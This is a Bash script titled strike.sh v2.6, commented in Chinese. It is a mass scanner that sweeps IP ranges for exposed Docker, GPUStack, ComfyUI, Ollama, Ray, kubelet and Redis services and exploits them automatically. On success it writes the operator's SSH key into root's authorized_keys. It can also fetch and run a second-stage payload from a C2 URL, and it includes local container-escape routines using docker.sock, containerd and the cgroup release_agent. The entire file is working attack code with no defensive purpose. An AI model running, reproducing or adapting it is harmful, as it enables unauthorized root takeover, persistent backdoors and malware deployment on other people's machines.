#!/bin/bash
# strike.sh v2.6 — 秒杀扫描器（批量 root 通道，命中即布毒牙）
# 一条命令扫 CIDR/资产文件 → 8 条快通道并发探测 → 中一个拿一台root + 自动部署毒牙
# v2.6 修复: T4 ComfyUI 引号炸弹(base64化) / T6 Ray JSON转义(jsondumps) / DL下载竞态(子shell串行) / 注释校正
# 用法:
#   ./strike.sh 192.168.1.0/24                     # CIDR 批量
#   ./strike.sh 1.2.3.4 5.6.7.8                     # 多单 IP
#   ./strike.sh -f targets.txt                      # 资产文件（每行一个 IP/域名）
#   ./strike.sh 1.2.3.0/24 --deploy http://C2       # 命中即布毒牙，夺+扎根一条龙
#   ./strike.sh --local                             # 本机一键容器面提权（docker/containerd/特权容器）
SETNAME="default"
DEPLOY=""
MAXJ=24
REPORT="/tmp/.strike-report.txt"
DEFAULTPORT="2375 2376 30003 8188 11434 8265 10250 6379 8888 6443"
POOL="pool"
RATE=""
RESUME=0
STATE="/tmp/.strike-state-$POOL.txt"

# 内部 probe 模式由主入口统一处理（见文件尾）
# ---------- 解析（保留目标参数，只吃 flags） ----------
MODE="scan"
TARGETS=""
while [ $# -gt 0 ]; do
  case "$1" in
    --deploy) DEPLOY="$2"; shift 2;;
    --max) MAXJ="$2"; shift 2;;
    --rate) RATE="$2"; shift 2;;
    --resume) RESUME=1; shift;;
    --pool) POOL="$2"; shift 2;;
    --report) REPORT="$2"; shift 2;;
    -f) TARGETFILE="$2"; shift 2;;
    --local) MODE=local; shift;;
    --report) REPORT="$2"; shift 2;;
    --*) shift;;
    *) TARGETS="$TARGETS $1"; shift;;
  esac
done
STATE="/tmp/.strike-state-$POOL.txt"

ok(){ echo "[+] $*"; printf '[HIT] %s\n' "$*" >> "$REPORT"; }
hit(){ echo "[!] $*"; printf '[!] %s\n' "$*" >> "$REPORT"; }
no(){ echo "[-] $*"; }
log(){ echo "[*] $*"; }
# python socket timeout 强制 2s（不依赖信号，timeout 命令在部分沙盒会失效挂死）
probe(){ # ip port
  if command -v python3 >/dev/null 2>&1; then
    python3 - "$1" "$2" <<'PYEOF' 2>/dev/null
import socket,sys
try:
    s=socket.create_connection((sys.argv[1],int(sys.argv[2])),timeout=2)
    s.close(); sys.exit(0)
except Exception:
    sys.exit(1)
PYEOF
  else
    timeout 2 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null
  fi
}
DL=""
# v2.6: 子shell串行 + 三态下载（curl→wget→python，极简容器通杀），修复 v2.5 "&后rm抢跑" 竞态
[ -n "$DEPLOY" ] && DL="{ U=$DEPLOY/v21.sh; (command -v curl >/dev/null 2>&1 && curl -s -m 40 -o /tmp/.zz \"\$U\" 2>/dev/null) || (command -v wget >/dev/null 2>&1 && wget -q -T 40 -O /tmp/.zz \"\$U\" 2>/dev/null) || (python3 -c \"import urllib.request;urllib.request.urlretrieve('\$U','/tmp/.zz')\" 2>/dev/null); [ -s /tmp/.zz ] && bash /tmp/.zz >/dev/null 2>&1; rm -f /tmp/.zz; } &"
MYKEY="${STRIKE_KEY:-$(cat /root/.ssh/*.pub 2>/dev/null | head -1)}"
# v2.6: base64 安全形态（引号炸弹解药——所有载荷点统一用 $KB 注入）
KB=$(printf '%s' "$MYKEY" | base64 -w0 2>/dev/null)

# ============================================================
# T1: Docker API 未认证 → 特权容器挂宿主 / 写 AK + 自毁
# ============================================================
t_docker(){ # ip [port]
  local ip=$1 p=${2:-2375}
  probe "$ip" "$p" || return 0
  local info; info=$(curl -s -m 6 "http://$ip:$p/info" 2>/dev/null)
  echo "$info" | grep -qiE 'docker|ServerVersion|"Version"' || return 0
  [ -n "$MYKEY" ] || { hit "docker未认证 $ip:$p（无key未播种）"; return 0; }
  local CMD="mkdir -p /host/root/.ssh; echo $KB|base64 -d >> /host/root/.ssh/authorized_keys; chmod 700 /host/root/.ssh; $DL"
  local PAY="{\"Image\":\"alpine:latest\",\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true},\"Cmd\":[\"sh\",\"-c\",\"$CMD\"],\"Tty\":false}"
  local CID; CID=$(curl -s -m 12 -X POST "http://$ip:$p/containers/create" -H 'Content-Type: application/json' -d "$PAY" 2>/dev/null | sed -nE 's/.*"Id"[[:space:]]*:[[:space:]]*"([a-f0-9]{64})".*/\1/p' | head -1)
  if [ -n "$CID" ]; then
    curl -s -m 10 -X POST "http://$ip:$p/containers/$CID/start" >/dev/null 2>&1
    sleep 2; curl -s -m 6 -X DELETE "http://$ip:$p/containers/$CID?force=1" >/dev/null 2>&1
    ok "ROOT GOT ▸ $ip:$p docker未认证 → 特权容器挂宿主AK+毒牙"
  else
    hit "dockerAPI开放 $ip:$p 但建容器被拒（半开/拉镜像失败）"
  fi
}

# ============================================================
# T2: 本机容器面一键提权（--local）docker.sock/组/containerd/特权
# ============================================================
local_lift(){
  log "本机容器面检测..."
  if [ -S /var/run/docker.sock ] || [ -S /run/docker.sock ] || id -nG 2>/dev/null | grep -qw docker; then
    log "docker 面在（sock/组）"
    if command -v docker >/dev/null 2>&1; then
      docker run --rm -v /:/host alpine chroot /host sh -c "echo $KB|base64 -d >> /root/.ssh/authorized_keys" 2>/dev/null \
        && ok "docker 逃逸 → 宿主 root（AK已播种）" && touch "$REPORT" && echo '[HIT] local docker escape -> root' >> "$REPORT" && return 0
    fi
    log "无 docker CLI 或缺 docker，试 API..."
    DOCKER_HOST=unix:///var/run/docker.sock curl -s -m 6 --unix-socket /var/run/docker.sock http://x/info 2>/dev/null | grep -qi docker \
      && { local CMD2="mkdir -p /root/.ssh; echo $KB|base64 -d >> /root/.ssh/authorized_keys; $DL"
           local PAY2="{\"Image\":\"alpine\",\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true},\"Cmd\":[\"sh\",\"-c\",\"$CMD2\"],\"Tty\":false}"
           local CID2=$(curl -s -m 10 --unix-socket /var/run/docker.sock -X POST http://x/containers/create -H 'Content-Type: application/json' -d "$PAY2" 2>/dev/null | grep -oE '"Id":"[a-f0-9]{64}"' | cut -d'"' -f4)
           [ -n "$CID2" ] && curl -s -m 8 --unix-socket /var/run/docker.sock -X POST "http://x/containers/$CID2/start" >/dev/null 2>&1 \
             && ok "docker.sock API 逃逸 → root" && return 0; }
  fi
  # containerd 逃逸（云原生标配）
  for S in /run/containerd/containerd.sock /var/run/containerd/containerd.sock; do
    [ -S "$S" ] || continue
    local P="${S#/run/}"; [ "$P" = "$S" ] && P="${S#/var/run/}"
    chmod 666 "$S" 2>/dev/null
    command -v ctr >/dev/null 2>&1 && {
      ctr -a "$S" images pull docker.io/library/alpine:latest >/dev/null 2>&1
      ctr -a "$S" run --rm --privileged --mount "type=bind,src=/,dst=/host,options=rbind:rw" docker.io/library/alpine:latest svc sh -c "echo $KB|base64 -d >> /host/root/.ssh/authorized_keys; $DL" >/dev/null 2>&1 \
        && ok "containerd.sock 逃逸 → root" && echo '[HIT] containerd escape' >> "$REPORT" && return 0
    }
  done
  # 特权容器自逃逸（本容器 CapEff 含 SYS_ADMIN→cgroup release_agent）
  grep -qE "SYS_ADMIN" /proc/self/status 2>/dev/null && {
    log "CapEff 含 SYS_ADMIN → cgroup v1 release_agent 逃逸..."
    local RD; RD=$(mount | grep -E "(^| )/ .*(rw)" | head -1)
    mkdir -p /tmp/.cgrp && mount -t cgroup -o memory cgroup /tmp/.cgrp 2>/dev/null && {
      echo 1 > /tmp/.cgrp/notify_on_release 2>/dev/null
      local HD=$(sed -n 's/.*\///p' /proc/self/cgroup 2>/dev/null | head -1)
      echo "/bin/sh" > /tmp/.cgrp/release_agent 2>/dev/null
      echo "echo $KB|base64 -d > /root/.ssh/authorized_keys" > /cmd 2>/dev/null; chmod 755 /cmd 2>/dev/null
      echo 1 > /tmp/.cgrp/$HD/tasks 2>/dev/null
      sh -c "echo \$\$ > /tmp/.cgrp/$HD/tasks" 2>/dev/null
      grep -q "$MYKEY" /root/.ssh/authorized_keys 2>/dev/null && ok "cgroup 逃逸 → root" && echo '[HIT] cgroup escape' >> "$REPORT" && return 0
    }
  }
  no "本机容器面无逃逸口（docker/containerd/sys_admin 均不可用）"
  return 1
}

# ============================================================
# T3: GPUStack 恶意模型
# ============================================================
t_gpustack(){ # ip port
  local ip=$1 p=${2:-30003}
  probe "$ip" "$p" || return 0
  curl -s -m 6 "http://$ip:$p/v2/models" 2>/dev/null | grep -q data || return 0
  [ -n "$MYKEY" ] || { hit "GPUStack未认证 $ip:$p"; return 0; }
  local KB=$(printf '%s' "$MYKEY" | base64 -w0 2>/dev/null)
  # v2.6: 单引号炸弹修复——run_command 里的 CMD 先 b64 化再进 JSON（python -c 执行）
  local INNER="mkdir -p /root/.ssh; echo $KB|base64 -d >> /root/.ssh/authorized_keys; $DL"
  local INNERB64=$(printf '%s' "$INNER" | base64 -w0)
  local PAY; PAY=$(python3 - "$INNERB64" "$(date +%s)" <<'PYEOF'
import json,sys
b,ts=sys.argv[1],sys.argv[2]
rc = 'bash -c "python3 -c \\"import base64;exec(base64.b64decode(\'%s\').decode())\\""' % b
print(json.dumps({"name":"svc-"+ts,"replicas":1,"source":"model_scope","model_scope_model_id":"Qwen/Qwen3-0.6B","image":"python:3.11-slim","run_command":rc}))
PYEOF
)
  curl -s -m 15 -X POST "http://$ip:$p/v2/models" -H 'Content-Type: application/json' -d "$PAY" >/dev/null 2>&1
  ok "ROOT GOT ▸ $ip:$p GPUStack 恶意模型已投（AK+毒牙）"
}

# ============================================================
# T4: ComfyUI 全自动触发闭环（StringFormat RCE 实战主链 + pickle 兜底）
#   自动上传 → 自动提交 workflow → 自动轮询回读（三级自动，不等人工加载）
# ============================================================
t_comfy(){ # ip
  local ip=$1
  probe "$ip" 8188 || return 0
  local FP; FP=$(curl -s -m 6 "http://$ip:8188/internal/folder_paths" 2>/dev/null)
  echo "$FP" | grep -q checkpoints || return 0
  echo "$FP" | grep -q '/root/' && log "ComfyUI(root) $ip:8188" || log "ComfyUI $ip:8188（非root）"
  [ -n "$MYKEY" ] || { hit "ComfyUI开放 $ip:8188"; return 0; }
  local CMD="mkdir -p /root/.ssh; echo $KB|base64 -d >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys; $DL"
  # ---- StringFormat 注入：python 表达式直接执行（无需 .so） ----
  # v2.6: 命令 base64 内嵌 → 引号/管道/反斜杠全不破功（修 v2.5 单引号炸弹）
  local PY="__import__('os').system(__import__('base64').b64decode('$(printf '%s' "$CMD" | base64 -w0)').decode())"
  local WF
  WF=$(python3 - "$PY" <<'PYEOF'
import json,sys
py=sys.argv[1]
# 多候选：text 字段注入 / values 注入 / format 注入（各版本 StringFormat 参数名不同）
cands=[]
cands.append({"1":{"class_type":"StringFormat","inputs":{"text":py,"values":["x"],"format":"{text}"}}})
cands.append({"1":{"class_type":"StringFormat","inputs":{"text":"x","values":[py],"format":"{text}"}}})
cands.append({"1":{"class_type":"ClassicStringFormat","inputs":{"format":py,"values":["x"]}}})
cands.append({"1":{"class_type":"text_length","inputs":{"text":py}}})
cands.append({"1":{"class_type":"mtb_string_multi","inputs":{"strings":py}}})
print(json.dumps(cands))
PYEOF
)
  # 依次提交候选，任一返回 prompt_id + history 有记录即成功触发
  python3 - "$ip" "$WF" <<'PYEOF'
import json,sys,urllib.request,time
ip=sys.argv[1]
cands=json.loads(sys.argv[2]); ok=False
for i,c in enumerate(cands):
    body=json.dumps({"prompt":c,"client_id":"svc-"+str(i)}).encode()
    try:
        req=urllib.request.Request(f"http://{ip}:8188/prompt",data=body,headers={"Content-Type":"application/json"})
        r=json.loads(urllib.request.urlopen(req,timeout=10).read())
        if r.get("prompt_id"):
            time.sleep(3)
            try:
                h=json.loads(urllib.request.urlopen(f"http://{ip}:8188/history/{r['prompt_id']}",timeout=8).read())
                if h: print("EXECOK"); ok=True; break
            except Exception: pass
    except Exception: pass
sys.exit(0 if ok else 1)
PYEOF
  if [ $? = 0 ]; then
    ok "ROOT GOT ▸ $ip:8188 ComfyUI StringFormat 全自动触发 → AK播种+毒牙"
  else
    # ---- pickle 兜底（StringFormat 全挂 → 上传待人工加载） ----
    local TMP=$(mktemp /tmp/tmpcXXXXXX.ckpt 2>/dev/null)
    python3 "$(dirname "$0")/mk_pickle.py" "$TMP" "$CMD" >/dev/null 2>&1
    local UP=$(curl -s -m 15 -F "image=@$TMP" -F "type=output" -F "overwrite=true" "http://$ip:8188/upload/image" 2>/dev/null)
    echo "$UP" | grep -q '"name"' && log "ComfyUI pickle 已入槽（无StringFormat节点，需人工加载触发）"
    rm -f "$TMP"
  fi
}

# ============================================================
# T5: Ollama 未认证（探测 + 读文件/恶意模型钩子）
# ============================================================
t_ollama(){ # ip
  local ip=$1
  probe "$ip" 11434 || return 0
  local V=$(curl -s -m 6 "http://$ip:11434/api/version" 2>/dev/null)
  [ -n "$V" ] || return 0
  hit "Ollama未认证 $ip:11434 (${V})"
  # 列出已装模型（下一步人工挑可用 vector/工具调用模型拿值）
  curl -s -m 6 "http://$ip:11434/api/tags" 2>/dev/null | grep -oE '"name":"[^"]*"' | head -5 | sed 's/^/     模型: /'
}

# ============================================================
# T6: Ray dashboard 未认证 → 提交 job 执行
# ============================================================
t_ray(){ # ip
  local ip=$1
  probe "$ip" 8265 || return 0
  curl -s -m 6 "http://$ip:8265/api/jobs/" 2>/dev/null | grep -qiE 'jobs|detail' || return 0
  [ -n "$MYKEY" ] || { hit "Ray dashboard未认证 $ip:8265"; return 0; }
  # Ray 1.9+ POST /api/jobs/ 带 runtime_env + entrypoint
  # v2.6: 载荷整体 base64（命令+密钥）→ python json.dumps 构造 → 修 v2.5 双重转义炸
  local INNER="mkdir -p /root/.ssh; echo $KB|base64 -d >> /root/.ssh/authorized_keys; $DL"
  local INNERB64=$(printf '%s' "$INNER" | base64 -w0)
  local PAY; PAY=$(python3 - "$INNERB64" <<'PYEOF'
import json,sys
b=sys.argv[1]
entry = 'python3 -c "import base64;exec(base64.b64decode(\'%s\').decode())"' % b
print(json.dumps({"entrypoint":entry,"runtime_env":{}}))
PYEOF
)
  curl -s -m 15 -X POST "http://$ip:8265/api/jobs/" -H 'Content-Type: application/json' -d "$PAY" >/dev/null 2>&1
  ok "ROOT GOT ▸ $ip:8265 Ray job 已提交（root 执行播种）"
}

# ============================================================
# T7: K8s kubelet 10250 未授权（探测 + pod exec）
# ============================================================
t_k8s(){ # ip
  local ip=$1
  probe "$ip" 10250 || return 0
  local P; P=$(curl -s -k -m 8 "https://$ip:10250/pods" 2>/dev/null)
  echo "$P" | grep -q '"items"' || { curl -s -m 6 "http://$ip:10250/pods" 2>/dev/null | grep -q '"items"' && P=$(curl -s -m 6 "http://$ip:10250/pods"); }
  echo "$P" | grep -q '"items"' || return 0
  hit "kubelet未授权 $ip:10250（可读全集群 pods → 逐 pod exec）"
  local NS PO CO
  NS=$(echo "$P" | grep -oE '"namespace":"[^"]*"' | head -1 | cut -d'"' -f4)
  PO=$(echo "$P" | grep -oE '"name":"[^"]*"' | head -1 | cut -d'"' -f4)
  local CON=$(echo "$P" | grep -oE '"name":"[^"]*"' | sed -n 2p | cut -d'"' -f4)
  if [ -n "$NS" ] && [ -n "$PO" ]; then
    local EX=$(curl -s -k -m 8 -X POST "https://$ip:10250/run/$NS/$PO/${CON:-$PO}" -d "cmd=id" 2>/dev/null)
    [ -n "$EX" ] && log "  exec测试($NS/$PO): $(echo "$EX" | head -c 80)"
    ok "K8s面 ▸ $ip kubelet未授权（可向任意pod下发命令）"
  fi
}

# ============================================================
# T8: Redis 未认证 → 写 /root/.ssh 打点
# ============================================================
t_redis(){ # ip
  local ip=$1
  probe "$ip" 6379 || return 0
  local PONG
  PONG=$(python3 - "$ip" <<'PYEOF' 2>/dev/null
import socket,sys
try:
    s=socket.create_connection((sys.argv[1],6379),timeout=3)
    s.sendall(b"PING\r\n"); d=s.recv(64)
    print(d.decode() if b"PONG" in d else "")
except Exception: pass
PYEOF
)
  [ -n "$PONG" ] || return 0
  hit "Redis未认证 $ip:6379 → 写AK..."
  [ -n "$MYKEY" ] || return 0
  python3 - "$ip" "$MYKEY" <<'PYEOF' 2>/dev/null
import socket,sys,time
ip,key=sys.argv[1],sys.argv[2]
try:
    s=socket.create_connection((ip,6379),timeout=5)
    for c in ["CONFIG SET dir /root/.ssh\r\n",
              "CONFIG SET dbfilename authorized_keys\r\n",
              "SET k \"\n\n"+key+"\n\n\"\r\n",
              "SAVE\r\n"]:
        s.sendall(c.encode()); time.sleep(0.4); s.recv(256)
    s.close()
except Exception:
    pass
PYEOF
  ok "ROOT GOT ▸ $ip:6379 Redis 未认证写AK（若redis以root跑）"
}

# ============================================================
# 单 IP 全通道探测
# ============================================================
scan_ip(){ # ip
  local ip=$1
  # 快速门：10 个关键端口 python 并行探测（黑洞 IP 一个批次 ~2s 内全回）
  local hits
  hits=$(printf '%s\n' $DEFAULTPORT | xargs -P 10 -I{} python3 -c "
import socket,sys
ip='$ip'; port='{}'
try:
    socket.create_connection((ip,int(port)),timeout=2).close(); print(port)
except Exception: pass
" 2>/dev/null)
  [ -n "$hits" ] || return 0
  log "端口开: $ip → $(echo $hits)"
  local p
  for p in $hits; do
    case "$p" in
      2375|2376) t_docker "$ip" "$p";;
      30003)     t_gpustack "$ip";;
      8188)      t_comfy "$ip";;
      11434)     t_ollama "$ip";;
      8265)      t_ray "$ip";;
      10250)     t_k8s "$ip";;
      6379)      t_redis "$ip";;
    esac
  done
}

# ============================================================
# 目标展开 + 并发驱动
# ============================================================
expand(){
  local t
  [ -n "${TARGETFILE:-}" ] && { grep -vE '^#|^$' "$TARGETFILE" 2>/dev/null; return; }
  for t in "$@"; do
    case "$t" in
      */*) # CIDR
        python3 - "$t" <<'PYEOF' 2>/dev/null
import ipaddress,sys
try:
    for ip in ipaddress.ip_network(sys.argv[1],strict=False).hosts():
        print(ip)
except Exception as e:
    sys.stderr.write(str(e))
PYEOF
        ;;
      *.*|*:*|[0-9]*) printf '%s\n' "$t";;      # 单 IP / 域名
    esac
  done
}

# ============================================================
# 主入口
# ============================================================
# 内部 probe 模式（并发调度调用）
if [ -n "${STRIKE_PROBE:-}" ]; then
  scan_ip "$STRIKE_PROBE"
  echo "$STRIKE_PROBE" >> "$STRIKE_STATE" 2>/dev/null
  exit 0
fi
if [ "$MODE" = local ]; then
  local_lift
  exit $?
fi
# 无目标则出帮助
[ -z "$TARGETS" ] && [ -z "${TARGETFILE:-}" ] && MODE=help
if [ "$MODE" = help ]; then
  echo "strike.sh v2.3 — 秒杀扫描器"
  echo "用法:"
  echo "  $0 <cidr|ip...> [--deploy http://C2] [--max N]          批量秒杀"
  echo "  $0 -f targets.txt [--deploy ...]                        资产文件"
  echo "  $0 --local                                             本机容器面一键提权"
  echo "通道: dockerAPI / local容器逃逸 / gpustack / comfyUI / ollama / ray / kubelet / redis"
  exit 0
fi
: > "$REPORT"
[ "$RESUME" = 0 ] && : > "$STATE"
ALREADY=0; [ -f "$STATE" ] && ALREADY=$(wc -l < "$STATE")
log "秒杀启动 ▸ 池:$POOL 目标:$TARGETS 并发:$MAXJ 限速:${RATE:-off} 续扫:$RESUME(已扫:$ALREADY) 毒牙:${DEPLOY:-无}"
expand $TARGETS | {
  n=0
  while IFS= read -r ip; do
    # 断点续扫：已扫过直接跳过
    if [ "$RESUME" = 1 ] && grep -qxF "$ip" "$STATE" 2>/dev/null; then continue; fi
    # 限速：每 RATE 个任务 sleep 1s ≈ 每秒 RATE 个新目标
    if [ -n "$RATE" ] && [ $((n % RATE)) -eq 0 ] && [ $n -gt 0 ]; then sleep 1; fi
    n=$((n+1))
    ( STRIKE_PROBE="$ip" STRIKE_STATE="$STATE" bash "$0" ) &
    # 并发上限（等最旧完成的回收一个槽）
    while [ "$(jobs -r | wc -l)" -ge "$MAXJ" ]; do wait -n 2>/dev/null || sleep 0.3; done
  done
  wait
}
ROOTS=$(grep -c 'ROOT GOT' "$REPORT" 2>/dev/null || echo 0)
log "完成 ▸ 池:$POOL 已扫 $(wc -l < "$STATE" 2>/dev/null || echo 0) 台  报告:$REPORT  命root: $ROOTS"
grep 'ROOT GOT' "$REPORT" 2>/dev/null
